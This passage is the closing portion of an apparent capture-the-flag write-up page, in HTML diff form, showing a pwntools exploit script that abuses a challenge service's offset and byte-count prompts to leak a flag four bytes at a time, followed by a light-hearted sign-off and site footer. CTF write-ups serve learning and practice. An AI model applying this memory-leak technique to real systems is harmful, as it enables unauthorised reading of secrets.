+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;offset: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;range: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4096&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;quoted</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Drain flag word by word</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_cmd</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;round: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">word</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;settled</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">send_cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;account: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;offset: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">word</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bytes: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunk</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;word </span><span class="si">{</span><span class="n">word</span><span class="si">:</span><span class="s2">02d</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">chunk</span><span class="si">}</span><span class="s2"> | </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">FLAG: </span><span class="si">{</span><span class="n">flag</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>And we get the full flag!
+I now have the highest form of respect for anyone who writes Vulkan code, and I hope segal stubs his toe for making this challenge.</p>
+
+    </div>
+  
+  <div class="posts">
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
